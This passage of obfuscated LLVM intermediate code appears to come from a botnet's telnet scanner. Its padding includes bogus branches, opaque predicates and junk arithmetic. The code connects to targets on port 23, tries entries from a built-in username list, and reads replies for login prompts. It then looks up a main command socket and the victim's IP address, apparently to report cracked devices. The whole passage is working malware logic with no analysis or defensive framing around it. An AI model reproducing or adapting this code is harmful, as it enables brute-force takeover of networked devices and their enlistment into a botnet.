  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1822, i32 0, i32 0
  %1824 = load i32, i32* %1823, align 16
  %1825 = call i32 @sclose(i32 %1824)
  %1826 = load i32, i32* %4, align 4
  %1827 = sext i32 %1826 to i64
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1827
  %1829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1828, i32 0, i32 2
  store i8 0, i8* %1829, align 8
  %1830 = load i32, i32* %4, align 4
  %1831 = sext i32 %1830 to i64
  %1832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1831
  %1833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1832, i32 0, i32 3
  store i8 1, i8* %1833, align 1
  %1834 = load i32, i32* @x.63
  %1835 = load i32, i32* @y.64
  %1836 = sub i32 %1834, 1
  %1837 = mul i32 %1834, %1836
  %1838 = urem i32 %1837, 2
  %1839 = icmp eq i32 %1838, 0
  %1840 = icmp slt i32 %1835, 10
  %1841 = or i1 %1839, %1840
  br i1 %1841, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1842

; <label>:1842:                                   ; preds = %originalBBpart2184, %1802
  br label %1843

; <label>:1843:                                   ; preds = %1842, %1596, %originalBBpart2164, %originalBBpart2156, %1448, %1424, %1212, %originalBBpart2128, %originalBBpart291, %originalBBpart283, %originalBBpart271, %originalBBpart247, %originalBBpart219
  br label %1844

; <label>:1844:                                   ; preds = %1843, %1703, %originalBBpart2172, %originalBBpart2168, %originalBBpart2160, %1461, %1433, %1366, %originalBBpart2144, %1281, %originalBBpart2136, %1142, %originalBBpart2111, %1003, %845, %822, %694, %490, %originalBBpart239, %238
  %1845 = load i32, i32* %4, align 4
  %1846 = add nsw i32 %1845, 1
  store i32 %1846, i32* %4, align 4
  br label %114

; <label>:1847:                                   ; preds = %114
  br label %96
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  store i32 %25, i32* %3, align 4
  %1849 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %1849, align 4
  %1850 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1851 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %1850, i16* %1851, align 2
  %1852 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %1853 = getelementptr inbounds [8 x i8], [8 x i8]* %1852, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1853, i8 0, i64 8, i32 4, i1 false)
  %1854 = load i32, i32* %3, align 4
  %1855 = zext i32 %1854 to i64
  %1856 = call i8* @llvm.stacksave()
  store i8* %1856, i8** %11, align 8
  %1857 = alloca %struct.telstate_t, i64 %1855, align 16
  %1858 = bitcast %struct.telstate_t* %1857 to i8*
  %1859 = load i32, i32* %3, align 4
  %1860 = sext i32 %1859 to i64
  %_ = sub i64 %1860, 5
  %gen = mul i64 %_, 5
  %_1 = sub i64 %1860, 5
  %gen2 = mul i64 %_1, 5
  %_3 = shl i64 %1860, 5
  %_4 = shl i64 %1860, 5
  %_5 = sub i64 0, %1860
  %gen6 = add i64 %_5, 5
  %_7 = sub i64 0, %1860
  %gen8 = add i64 %_7, 5
  %1861 = mul i64 %1860, 5
  call void @llvm.memset.p0i8.i64(i8* %1858, i8 0, i64 %1861, i32 16, i1 false)
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %59
  %1862 = load i32, i32* %4, align 4
  %1863 = sext i32 %1862 to i64
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1863
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1864, i32 0, i32 3
  store i8 1, i8* %1865, align 1
  %1866 = call noalias i8* @malloc(i64 1024) #2
  %1867 = load i32, i32* %4, align 4
  %1868 = sext i32 %1867 to i64
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1868
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1869, i32 0, i32 8
  store i8* %1866, i8** %1870, align 8
  %1871 = load i32, i32* %4, align 4
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1872
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1873, i32 0, i32 8
  %1875 = load i8*, i8** %1874, align 8
  call void @llvm.memset.p0i8.i64(i8* %1875, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %96
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %118
  %1876 = load i32, i32* %4, align 4
  %1877 = sext i32 %1876 to i64
  %1878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1877
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1878, i32 0, i32 2
  %1880 = load i8, i8* %1879, align 8
  %1881 = zext i8 %1880 to i32
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %187
  %1882 = load i32, i32* %4, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1883
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1884, i32 0, i32 5
  store i8 0, i8* %1885, align 1
  %1886 = load i32, i32* %4, align 4
  %1887 = sext i32 %1886 to i64
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1887
  %1889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1888, i32 0, i32 4
  %1890 = load i8, i8* %1889, align 2
  %_22 = sub i8 %1890, 1
  %gen23 = mul i8 %_22, 1
  %_24 = sub i8 %1890, 1
  %gen25 = mul i8 %_24, 1
  %1891 = add i8 %1890, 1
  store i8 %1891, i8* %1889, align 2
  br label %originalBB21

originalBB29alteredBB:                            ; preds = %originalBB29, %214
  %1892 = load i32, i32* %4, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1894, i32 0, i32 4
  %1896 = load i8, i8* %1895, align 2
  %1897 = zext i8 %1896 to i64
  %1898 = icmp eq i64 %1897, 6
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %244
  %1899 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %1899, align 4
  %1900 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1901 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %1900, i16* %1901, align 2
  %1902 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %1903 = getelementptr inbounds [8 x i8], [8 x i8]* %1902, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1903, i8 0, i64 8, i32 4, i1 false)
  %1904 = load i32, i32* %4, align 4
  %1905 = sext i32 %1904 to i64
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1905
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1906, i32 0, i32 1
  %1908 = load i32, i32* %1907, align 4
  %1909 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %1910 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1909, i32 0, i32 0
  store i32 %1908, i32* %1910, align 4
  %1911 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %1912 = load i32, i32* %4, align 4
  %1913 = sext i32 %1912 to i64
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1913
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1914, i32 0, i32 0
  store i32 %1911, i32* %1915, align 16
  %1916 = load i32, i32* %4, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 0
  %1920 = load i32, i32* %1919, align 16
  %1921 = bitcast %struct.timeval* %12 to i8*
  %1922 = call i32 @setsockopt(i32 %1920, i32 1, i32 20, i8* %1921, i32 16) #2
  %1923 = load i32, i32* %4, align 4
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1924
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1925, i32 0, i32 0
  %1927 = load i32, i32* %1926, align 16
  %1928 = bitcast %struct.timeval* %12 to i8*
  %1929 = call i32 @setsockopt(i32 %1927, i32 1, i32 21, i8* %1928, i32 16) #2
  %1930 = load i32, i32* %4, align 4
  %1931 = sext i32 %1930 to i64
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1931
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1932, i32 0, i32 0
  %1934 = load i32, i32* %1933, align 16
  %1935 = icmp eq i32 %1934, -1
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %298
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %337
  %1936 = call i32* @__errno_location() #13
  %1937 = load i32, i32* %1936, align 4
  %1938 = icmp ne i32 %1937, 115
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %377
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %407
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %521
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %538
  %1939 = load i32, i32* %5, align 4
  %1940 = icmp eq i32 %1939, -1
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %572
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %598
  %1941 = load i32, i32* %4, align 4
  %1942 = sext i32 %1941 to i64
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1942
  %1944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1943, i32 0, i32 0
  %1945 = load i32, i32* %1944, align 16
  %1946 = call i32 @sclose(i32 %1945)
  %1947 = load i32, i32* %4, align 4
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1948
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1949, i32 0, i32 2
  store i8 0, i8* %1950, align 8
  %1951 = load i32, i32* %4, align 4
  %1952 = sext i32 %1951 to i64
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1952
  %1954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1953, i32 0, i32 3
  store i8 1, i8* %1954, align 1
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %629
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %653
  %1955 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1956 = load i32, i32* %4, align 4
  %1957 = sext i32 %1956 to i64
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1957
  %1959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1958, i32 0, i32 6
  store i32 %1955, i32* %1959, align 4
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %712
  %1960 = load i32, i32* %4, align 4
  %1961 = sext i32 %1960 to i64
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1961
  %1963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1962, i32 0, i32 8
  %1964 = load i8*, i8** %1963, align 8
  %1965 = call i64 @strlen(i8* %1964) #10
  %1966 = trunc i64 %1965 to i16
  %1967 = load i32, i32* %4, align 4
  %1968 = sext i32 %1967 to i64
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1968
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1969, i32 0, i32 7
  store i16 %1966, i16* %1970, align 16
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %764
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %781
  %1971 = load i32, i32* %4, align 4
  %1972 = sext i32 %1971 to i64
  %1973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1972
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1973, i32 0, i32 0
  %1975 = load i32, i32* %1974, align 16
  %1976 = load i32, i32* %4, align 4
  %1977 = sext i32 %1976 to i64
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 4
  %1980 = load i8, i8* %1979, align 2
  %1981 = zext i8 %1980 to i64
  %1982 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1981
  %1983 = load i8*, i8** %1982, align 8
  %1984 = load i32, i32* %4, align 4
  %1985 = sext i32 %1984 to i64
  %1986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1985
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1986, i32 0, i32 4
  %1988 = load i8, i8* %1987, align 2
  %1989 = zext i8 %1988 to i64
  %1990 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1989
  %1991 = load i8*, i8** %1990, align 8
  %1992 = call i64 @strlen(i8* %1991) #10
  %1993 = call i64 @send(i32 %1975, i8* %1983, i64 %1992, i32 16384)
  %1994 = icmp slt i64 %1993, 0
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %860
  %1995 = load i32, i32* %4, align 4
  %1996 = sext i32 %1995 to i64
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1996
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1997, i32 0, i32 2
  store i8 4, i8* %1998, align 8
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %888
  %1999 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2000 = load i32, i32* %4, align 4
  %2001 = sext i32 %2000 to i64
  %2002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2001
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2002, i32 0, i32 6
  store i32 %1999, i32* %2003, align 4
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %910
  %2004 = load i32, i32* %4, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2005
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2006, i32 0, i32 0
  %2008 = load i32, i32* %2007, align 16
  %2009 = load i32, i32* %4, align 4
  %2010 = sext i32 %2009 to i64
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2010
  %2012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2011, i32 0, i32 8
  %2013 = load i8*, i8** %2012, align 8
  %2014 = load i32, i32* %4, align 4
  %2015 = sext i32 %2014 to i64
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2015
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2016, i32 0, i32 7
  %2018 = load i16, i16* %2017, align 16
  %2019 = zext i16 %2018 to i32
  %2020 = call i32 @readUntil(i32 %2008, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2013, i32 1024, i32 %2019)
  %2021 = icmp ne i32 %2020, 0
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %945
  %2022 = load i32, i32* %4, align 4
  %2023 = sext i32 %2022 to i64
  %2024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2023
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2024, i32 0, i32 6
  store i32 0, i32* %2025, align 4
  %2026 = load i32, i32* %4, align 4
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2027
  %2029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2028, i32 0, i32 7
  store i16 0, i16* %2029, align 16
  %2030 = load i32, i32* %4, align 4
  %2031 = sext i32 %2030 to i64
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 8
  %2034 = load i8*, i8** %2033, align 8
  %2035 = call i8* @strstr(i8* %2034, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0)) #10
  %2036 = icmp ne i8* %2035, null
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %982
  %2037 = load i32, i32* %4, align 4
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2038
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2039, i32 0, i32 2
  store i8 100, i8* %2040, align 8
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %1017
  %2041 = load i32, i32* %4, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2042
  %2044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2043, i32 0, i32 0
  %2045 = load i32, i32* %2044, align 16
  %2046 = call i32 @sclose(i32 %2045)
  %2047 = load i32, i32* %4, align 4
  %2048 = sext i32 %2047 to i64
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2048
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2049, i32 0, i32 2
  store i8 0, i8* %2050, align 8
  %2051 = load i32, i32* %4, align 4
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2052
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2053, i32 0, i32 3
  store i8 0, i8* %2054, align 1
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %1060
  %2055 = load i32, i32* %4, align 4
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2057, i32 0, i32 6
  %2059 = load i32, i32* %2058, align 4
  %_114 = shl i32 %2059, 8
  %_115 = shl i32 %2059, 8
  %_116 = sub i32 %2059, 8
  %gen117 = mul i32 %_116, 8
  %_118 = sub i32 0, %2059
  %gen119 = add i32 %_118, 8
  %_120 = shl i32 %2059, 8
  %_121 = sub i32 %2059, 8
  %gen122 = mul i32 %_121, 8
  %2060 = add i32 %2059, 8
  %2061 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2062 = icmp ult i32 %2060, %2061
  br label %originalBB113

originalBB126alteredBB:                           ; preds = %originalBB126, %1100
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1157
  %2063 = load i32, i32* %4, align 4
  %2064 = sext i32 %2063 to i64
  %2065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2064
  %2066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2065, i32 0, i32 0
  %2067 = load i32, i32* %2066, align 16
  %2068 = call i64 @send(i32 %2067, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i32 0, i32 0), i64 2, i32 16384)
  %2069 = icmp slt i64 %2068, 0
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1181
  %2070 = load i32, i32* %4, align 4
  %2071 = sext i32 %2070 to i64
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2071
  %2073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2072, i32 0, i32 0
  %2074 = load i32, i32* %2073, align 16
  %2075 = call i32 @sclose(i32 %2074)
  %2076 = load i32, i32* %4, align 4
  %2077 = sext i32 %2076 to i64
  %2078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2077
  %2079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2078, i32 0, i32 2
  store i8 0, i8* %2079, align 8
  %2080 = load i32, i32* %4, align 4
  %2081 = sext i32 %2080 to i64
  %2082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2081
  %2083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2082, i32 0, i32 3
  store i8 1, i8* %2083, align 1
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1249
  %2084 = load i32, i32* %4, align 4
  %2085 = sext i32 %2084 to i64
  %2086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2085
  %2087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2086, i32 0, i32 6
  store i32 0, i32* %2087, align 4
  %2088 = load i32, i32* %4, align 4
  %2089 = sext i32 %2088 to i64
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2089
  %2091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2090, i32 0, i32 7
  store i16 0, i16* %2091, align 16
  %2092 = load i32, i32* %4, align 4
  %2093 = sext i32 %2092 to i64
  %2094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2093
  %2095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2094, i32 0, i32 8
  %2096 = load i8*, i8** %2095, align 8
  %2097 = call i8* @strstr(i8* %2096, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %2098 = icmp ne i8* %2097, null
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1309
  %2099 = load i32, i32* %4, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2100
  %2102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2101, i32 0, i32 8
  %2103 = load i8*, i8** %2102, align 8
  call void @llvm.memset.p0i8.i64(i8* %2103, i8 0, i64 1024, i32 1, i1 false)
  %2104 = load i32, i32* %4, align 4
  %2105 = sext i32 %2104 to i64
  %2106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2105
  %2107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2106, i32 0, i32 0
  %2108 = load i32, i32* %2107, align 16
  %2109 = call i32 @sclose(i32 %2108)
  %2110 = load i32, i32* %4, align 4
  %2111 = sext i32 %2110 to i64
  %2112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2111
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2112, i32 0, i32 2
  store i8 0, i8* %2113, align 8
  %2114 = load i32, i32* %4, align 4
  %2115 = sext i32 %2114 to i64
  %2116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2115
  %2117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2116, i32 0, i32 3
  store i8 1, i8* %2117, align 1
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1345
  %2118 = load i32, i32* %4, align 4
  %2119 = sext i32 %2118 to i64
  %2120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2119
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2120, i32 0, i32 2
  store i8 7, i8* %2121, align 8
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1372
  %2122 = load i32, i32* %4, align 4
  %2123 = sext i32 %2122 to i64
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2123
  %2125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2124, i32 0, i32 8
  %2126 = load i8*, i8** %2125, align 8
  %2127 = call i64 @strlen(i8* %2126) #10
  %2128 = trunc i64 %2127 to i16
  %2129 = load i32, i32* %4, align 4
  %2130 = sext i32 %2129 to i64
  %2131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2130
  %2132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2131, i32 0, i32 7
  store i16 %2128, i16* %2132, align 16
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1476
  %2133 = load i32, i32* %4, align 4
  %2134 = sext i32 %2133 to i64
  %2135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2134
  %2136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2135, i32 0, i32 2
  store i8 9, i8* %2136, align 8
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1505
  %2137 = load i32, i32* %4, align 4
  %2138 = sext i32 %2137 to i64
  %2139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2138
  %2140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2139, i32 0, i32 0
  %2141 = load i32, i32* %2140, align 16
  %2142 = call i32 @sclose(i32 %2141)
  %2143 = load i32, i32* %4, align 4
  %2144 = sext i32 %2143 to i64
  %2145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2144
  %2146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2145, i32 0, i32 2
  store i8 0, i8* %2146, align 8
  %2147 = load i32, i32* %4, align 4
  %2148 = sext i32 %2147 to i64
  %2149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2148
  %2150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2149, i32 0, i32 3
  store i8 1, i8* %2150, align 1
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1536
  %2151 = load i32, i32* %4, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2152
  %2154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2153, i32 0, i32 2
  store i8 10, i8* %2154, align 8
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1565
  %2155 = load i32, i32* %4, align 4
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2156
  %2158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2157, i32 0, i32 0
  %2159 = load i32, i32* %2158, align 16
  %2160 = call i32 @sclose(i32 %2159)
  %2161 = load i32, i32* %4, align 4
  %2162 = sext i32 %2161 to i64
  %2163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2162
  %2164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2163, i32 0, i32 2
  store i8 0, i8* %2164, align 8
  %2165 = load i32, i32* %4, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2166
  %2168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2167, i32 0, i32 3
  store i8 1, i8* %2168, align 1
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1633
  %2169 = load i32, i32* %4, align 4
  %2170 = sext i32 %2169 to i64
  %2171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2170
  %2172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2171, i32 0, i32 6
  store i32 0, i32* %2172, align 4
  %2173 = load i32, i32* %4, align 4
  %2174 = sext i32 %2173 to i64
  %2175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2174
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2175, i32 0, i32 7
  store i16 0, i16* %2176, align 16
  %2177 = load i32, i32* @mainCommSock, align 4
  %2178 = load i32, i32* %4, align 4
  %2179 = sext i32 %2178 to i64
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 1
  %2182 = bitcast i32* %2181 to %struct.in_addr*
  %2183 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2182, i32 0, i32 0
  %2184 = load i32, i32* %2183, align 4
  %2185 = call i8* @inet_ntoa(i32 %2184) #2
  %2186 = load i32, i32* %4, align 4
  %2187 = sext i32 %2186 to i64
  %2188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %2187
  %2189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2188, i32 0, i32 4
  %2190 = load i8, i8* %2189, align 2
  %2191 = zext i8 %2190 to i64
  %2192 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %2191
  %2193 = load i8*, i8** %2192, align 8
  %2194 = load i32, i32* %4, align 4
  %2195 = sext i32 %2194 to i64
